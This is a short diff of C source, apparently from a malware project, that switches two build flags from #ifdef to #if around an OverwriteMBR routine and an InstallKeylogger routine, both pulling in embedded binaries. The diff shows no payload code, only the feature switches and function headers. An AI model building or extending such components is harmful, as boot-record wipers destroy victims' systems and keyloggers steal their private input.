@@ -1,4 +1,4 @@
-#ifdef OVERWRITE_MBR
+#if OVERWRITE_MBR
 #include "Binaries/BootBinary.h"
 
 static void OverwriteMBR()
@@ -19,7 +19,7 @@ static void OverwriteMBR()
 #endif
 
 
-#ifdef USE_KEYLOGGER
+#if USE_KEYLOGGER
 #include "Binaries/KeyLogBinary.h"
 
 static void InstallKeylogger(const char* path)
